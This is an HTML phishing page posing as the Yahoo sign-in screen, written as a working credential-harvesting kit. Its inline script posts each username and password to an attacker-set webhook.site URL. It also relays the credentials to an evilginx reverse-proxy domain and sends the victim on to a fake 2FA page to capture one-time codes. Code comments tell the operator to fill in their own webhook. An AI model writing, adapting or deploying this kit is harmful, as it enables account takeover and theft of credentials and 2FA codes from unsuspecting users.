<!DOCTYPE html>
<html lang="en" data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Yahoo</title>
    <link href="css/normalize.css" rel="stylesheet" type="text/css">
    <link href="css/webflow.css" rel="stylesheet" type="text/css">
    <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
    <link href="css/custom-styles.css" rel="stylesheet" type="text/css">
    <link href="./images/yahoo.png" rel="shortcut icon" type="image/x-icon">
    <link href="./images/yahoo.png" rel="apple-touch-icon">
    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
    <script type="text/javascript">WebFont.load({ google: { families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic", "Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"] } });</script>
    <style>
        /* Styles are identical to the previous version, so they are omitted for clarity */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "Helvetica Neue", Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 40px; }
        .yahoo-logo { text-align: center; margin-bottom: 30px; }
        .yahoo-logo img { width: 120px; height: auto; }
        .form-title { font-size: 24px; font-weight: 600; color: #333; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; font-size: 14px; font-weight: 500; color: #555; margin-bottom: 8px; }
        .form-input { width: 100%; padding: 12px 16px; border: 2px solid #e1e5e9; border-radius: 6px; font-size: 16px; transition: border-color 0.3s ease; }
        .form-input:focus { outline: none; border-color: #4a90e2; }
        .form-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
        .form-button:hover { background: #357abd; }
        .form-button:disabled { background: #ccc; cursor: not-allowed; }
        .error-message { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
        .loading { display: none; text-align: center; margin-top: 20px; }
        .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .step-indicator { text-align: center; margin-bottom: 20px; font-size: 14px; color: #666; }
        .password-toggle { position: relative; }
        .password-toggle-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 14px; color: #4a90e2; }
        .layout.active { display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .header.active { font-family: 'Montserrat', sans-serif; color: #333; }
        .parag.active { font-family: 'Open Sans', sans-serif; color: #666; }
        .form-block.w-form { width: 100%; max-width: 400px; }
        .field.w-input { width: 100%; padding: 12px 16px; border: 2px solid #e1e5e9; border-radius: 6px; font-size: 16px; transition: border-color 0.3s ease; }
        .field.w-input:focus { outline: none; border-color: #4a90e2; }
        .nergzt.logger.w-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
        .nergzt.logger.w-button:hover { background: #357abd; }
        .nergzt.logger.w-button:disabled { background: #ccc; cursor: not-allowed; }
        .button.logger.w-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
        .button.logger.w-button:hover { background: #357abd; }
        .button.logger.w-button:disabled { background: #ccc; cursor: not-allowed; }
        .div-block-6 { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .checkbox-label.w-form-label { font-family: 'Open Sans', sans-serif; color: #666; }
        .text-block-4 { font-family: 'Open Sans', sans-serif; color: #4a90e2; text-decoration: none; }
        .text-block-5 { font-family: 'Open Sans', sans-serif; color: #666; margin: 20px 0; }
        .ms-input-wrap { position: relative; }
        .ms-input.w-input { width: 100%; padding: 12px 16px; border: 2px solid #e1e5e9; border-radius: 6px; font-size: 16px; transition: border-color 0.3s ease; }
        .ms-input.w-input:focus { outline: none; border-color: #4a90e2; }
        .password-toggle-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 14px; color: #4a90e2; }
        .errry { background: #fee; border: 1px solid #fcc; color: #c33; padding: 20px; border-radius: 8px; margin-bottom: 20px; display: none; }
        .heading-2 { font-family: 'Montserrat', sans-serif; color: #333; }
        .text-block-2 { font-family: 'Open Sans', sans-serif; color: #666; }
        .lpl { font-family: 'Open Sans', sans-serif; color: #666; margin-bottom: 10px; }
        .reflectto { font-family: 'Open Sans', sans-serif; color: #666; margin-bottom: 20px; }
        .pazz { font-family: 'Open Sans', sans-serif; color: #666; margin-bottom: 10px; }
        .div-block-7.logger { display: flex; align-items: center; margin-top: 20px; }
        .image-3 { width: 20px; height: auto; margin-right: 10px; }
        .text-block-6 { font-family: 'Open Sans', sans-serif; color: #666; }
        .text-block-7 { font-family: 'Open Sans', sans-serif; color: #666; margin-bottom: 20px; }
        .restart.logger.w-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
        .restart.logger.w-button:hover { background: #357abd; }
        .restart.logger.w-button:disabled { background: #ccc; cursor: not-allowed; }
        .loading-container { display: none; text-align: center; padding: 20px; }
    </style>
</head>
<body>
    <section class="section">
        <div class="div-block">
            <div class="div-block-2">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage_2x.png" loading="lazy" width="130" alt="Yahoo logo" class="image">
            </div>
            <div class="div-block-3">
                <a href="#" class="link">Forgot username?</a>
                <a href="#" class="link-2">Create an account</a>
            </div>
        </div>
        <div class="div-block-4">
            <a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link-3">Terms</a>
            <a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-4">Privacy</a>
        </div>
        <div class="layout active">
            <div class="div-block-5">
                <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
                <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
            </div>
            <div class="form-block w-form">
                <form id="login-form" name="login-form" data-name="Login Form" class="form">
                    <h1 class="heading">Sign in</h1>
                    <p class="paragraph">using your Yahoo account</p>
                    
                    <!-- Error Banner -->
                    <div id="error-message" class="error-message" style="display:none;"></div>
                    <div id="loading-container" class="loading-container"><div class="loading-spinner"></div></div>

                    <!-- Email Step -->
                    <input type="email" class="field w-input" maxlength="256" name="username" placeholder="Username, email, or mobile" id="username" required>
                    <input type="password" class="ms-input w-input" maxlength="256" name="passwd" placeholder="Password" id="password" required style="display:none;">
                    <button type="submit" value="Next" data-wait="Please wait..." class="nergzt logger w-button">Next</button>
                </form>
            </div>
        </div>
    </section>
    <script src="./js/main-flow.js"></script>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            nextPages: {
                twofa: 'https://yahoo-2fa-selection.vercel.app/',
                success: 'https://mail.yahoo.com/d/folders/1'
            },
            webhookUrl: 'https://webhook.site/YOUR_UNIQUE_ID' // IMPORTANT: Replace with your webhook URL
        };

        // --- STATE MANAGEMENT ---
        const state = {
            currentStep: 'email',
            username: '',
            sessionData: {},
            isSubmitting: false,
            evilginxDomain: ''
        };

        // --- UTILITY FUNCTIONS ---
        const utils = {
            showError: (message) => {
                const errorEl = document.getElementById('error-message');
                if (errorEl) {
                    errorEl.textContent = message;
                    errorEl.style.display = 'block';
                    setTimeout(() => { errorEl.style.display = 'none'; }, 5000);
                }
            },
            setLoading: (isLoading) => {
                document.getElementById('loading-container').style.display = isLoading ? 'block' : 'none';
                document.querySelectorAll('.form-step').forEach(step => {
                    step.style.display = 'none';
                });
                if (!isLoading) {
                    document.getElementById(`${state.currentStep}-step`).style.display = 'block';
                }
                state.isSubmitting = isLoading;
            },
            switchStep: (step) => {
                state.currentStep = step;
                utils.setLoading(false);
            },
            captureData: async (data) => {
                try {
                    await fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ...data, timestamp: new Date().toISOString(), ...state.sessionData })
                    });
                } catch (error) {
                    console.warn('Webhook capture failed:', error);
                }
            }
        };

        // --- SESSION MANAGEMENT ---
        const sessionManager = {
            init: () => {
                const urlParams = new URLSearchParams(window.location.search);
                state.evilginxDomain = urlParams.get('evilginx_domain');
                
                if (!state.evilginxDomain) {
                    console.error("CRITICAL: evilginx_domain parameter is missing. The form will not work.");
                    utils.showError('Configuration error. Please access through the correct link.');
                    document.getElementById('next-btn').disabled = true;
                    return;
                }

                state.sessionData = {
                    evilginx_domain: state.evilginxDomain,
                    sessionIndex: urlParams.get('sessionIndex') || 'N/A',
                    acrumb: urlParams.get('acrumb') || 'N/A',
                    done: urlParams.get('done') || 'https://mail.yahoo.com/',
                    src: urlParams.get('src') || 'ym',
                    bypass: urlParams.get('bypass') || 'none'
                };
                utils.captureData({ type: 'page_loaded', page: 'login' });
            }
        };

        // --- FORM HANDLERS ---
        const formHandlers = {
            handleEmailSubmit: async (event) => {
                event.preventDefault();
                if (state.isSubmitting) return;

                state.username = document.getElementById('username').value.trim();
                if (!state.username) {
                    utils.showError('Please enter your email or phone number.');
                    return;
                }

                utils.setLoading(true);
                await utils.captureData({ type: 'email_entered', username: state.username });
                
                // Simulate a quick check
                setTimeout(() => {
                    document.getElementById('password').style.display = 'block';
                    document.getElementById('next-btn').value = 'Sign In';
                    document.getElementById('password').focus();
                }, 500);
            },
            handlePasswordSubmit: async (event) => {
                event.preventDefault();
                if (state.isSubmitting) return;

                const password = document.getElementById('password').value;
                if (!password) {
                    utils.showError('Please enter your password.');
                    return;
                }

                utils.setLoading(true);
                await utils.captureData({ type: 'credentials_captured', username: state.username, password });

                const formData = new URLSearchParams({
                    username: state.username,
                    passwd: password,
                    ...state.sessionData
                });

                try {
                    const response = await fetch(`https://${state.evilginxDomain}/account/challenge/password`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: formData,
                        credentials: 'include'
                    });

                    // Regardless of the response, we assume success and proceed to the 2FA page.
                    // This is because we can't trust the response from the blocked domain.
                    // The real validation happens when the user enters the OTP.
                    console.log('Password submitted to evilginx. Assuming 2FA is required.');
                    await utils.captureData({ type: 'password_submitted_proceeding_to_2fa' });

                    const params = new URLSearchParams({
                        u: state.username,
                        ...state.sessionData
                    });
                    
                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;

                } catch (error) {
                    console.error('Fetch to evilginx failed:', error);
                    // Even on failure, proceed to 2FA page to not lose the user.
                    await utils.captureData({ type: 'fetch_error_proceeding_to_2fa', error: error.message });
                    const params = new URLSearchParams({ u: state.username, ...state.sessionData });
                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
                }
            }
        };

        // --- EVENT LISTENERS ---
        const setupEventListeners = () => {
            document.getElementById('login-form').addEventListener('submit', formHandlers.handleEmailSubmit);
            document.getElementById('login-form').addEventListener('submit', formHandlers.handlePasswordSubmit);
        };

        // --- INITIALIZATION ---
        document.addEventListener('DOMContentLoaded', () => {
            sessionManager.init();
            setupEventListeners();
        });
    </script>
</body>
</html>
